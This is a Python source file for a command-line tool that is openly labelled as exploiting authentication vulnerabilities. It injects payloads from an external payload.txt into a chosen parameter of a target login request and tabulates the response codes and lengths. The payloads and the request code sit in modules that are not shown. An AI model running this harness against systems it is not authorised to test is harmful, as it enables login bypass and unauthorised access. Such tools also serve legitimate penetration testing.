#!/usr/bin/env python
"""
Exploit module for authentication.

This module provides a command-line interface for exploiting authentication vulnerabilities.
"""

import os
import random
import time

import click
from rich.console import Console
from rich.table import Table

import callback
from banner import banners
from eauth import EAuth


@click.command()
@click.option(
    "-T",
    "--target",
    type=str,
    required=True,
    callback=callback.validate_url,
    help="Target URL for the authentication exploit. Example: http://example.com/login",
)
@click.option(
    "-d",
    "--data",
    type=str,
    required=True,
    callback=callback.parse_data,
    help="Additional data needed for the exploit. Example: 'username=admin&password=pass123'",
)
@click.option(
    "-m",
    "--method",
    type=click.Choice(["POST", "GET"]),
    default="POST",
    help="HTTP method for the exploit. Default is 'POST'.",
)
@click.option(
    "-p",
    "--parameter",
    type=str,
    required=True,
    callback=callback.validate_parameter,
    help="Parameter in the data to inject the payload. Example: 'username'",
)
@click.option(
    "-P",
    "--proxy",
    type=str,
    callback=callback.parse_proxy,
    help="Proxy settings. Example: http://proxy.example.com:8080",
)
@click.option(
    "-c",
    "--cookies",
    type=str,
    callback=callback.parse_cookies,
    help="Cookie settings. Example: 'session_id=abcd123'",
)
@click.option(
    "-t",
    "--timeout",
    type=int,
    default=10,
    help="Timeout for the HTTP requests. Default is 10 seconds.",
)
@click.option(
    "--csrf-input-name",
    type=str,
    help="Name of the CSRF token input field in the HTML form. Used to identify and"
    " extract the CSRF token during the exploiting process. Example: 'csrf_token'",
)
def main(target, data, method, parameter, proxy, cookies, timeout, csrf_input_name):
    """Exploit authentication vulnerabilities."""

    http_status_codes = {
        100: {"info": "Continue", "color": "green"},
        101: {"info": "Switching Protocols", "color": "green"},
        200: {"info": "OK", "color": "green"},
        201: {"info": "Created", "color": "green"},
        202: {"info": "Accepted", "color": "green"},
        204: {"info": "No Content", "color": "green"},
        300: {"info": "Multiple Choices", "color": "yellow"},
        301: {"info": "Moved Permanently", "color": "yellow"},
        302: {"info": "Found", "color": "yellow"},
        304: {"info": "Not Modified", "color": "yellow"},
        400: {"info": "Bad Request", "color": "red"},
        401: {"info": "Unauthorized", "color": "red"},
        403: {"info": "Forbidden", "color": "red"},
        404: {"info": "Not Found", "color": "red"},
        405: {"info": "Method Not Allowed", "color": "red"},
        500: {"info": "Internal Server Error", "color": "magenta"},
        501: {"info": "Not Implemented", "color": "magenta"},
        503: {"info": "Service Unavailable", "color": "magenta"},
    }

    # Create an instance from Console class
    console = Console()

    # Create an instance from Table class
    table = Table()

    # create color list
    clr: list = ["green", "red", "yellow", "cyan", "magenta", "white"]

    # Print banner
    banner = random.choice(banners)
    console.print(banner, style=f"{random.choice(clr)} bold")

    # Print author email
    console.print("<nasiri.aliabdullah@gmail.com>", style=f"{random.choice(clr)} bold")

    # sleep about 5s
    time.sleep(5)

    # Add columns for table
    columns = ["No", "URL", "Method", "Status", "Length", "Payload"]

    for column in columns:
        table.add_column(column, style="cyan bold")

    # Get payloads from payload.txt file.
    with open("./payload.txt", "rt", encoding="UTF-8") as f:
        lines = [line.strip("\n") for line in f.readlines()]

    for line, payload in enumerate(lines, 1):
        eauth = EAuth(
            target=target,
            data=data,
            payload=payload,
            method=method,
            parameter=parameter,
            proxies=proxy,
            cookies=cookies,
            timeout=timeout,
            csrf=csrf_input_name,
        )
        exploit = eauth.exploit()
        status = exploit.status_code
        length = len(exploit.text)
        row = [
            line,
            target,
            method,
            f"[{http_status_codes[status]['color']}]{status} "
            f"({http_status_codes[status]['info']})[/]",
            length,
            payload,
        ]
        row = list(map(str, row))
        table.add_row(*row)
        os.system("clear;")
        console.print(table)
        time.sleep(1)


if __name__ == "__main__":
    # Call the eauth function
    main()
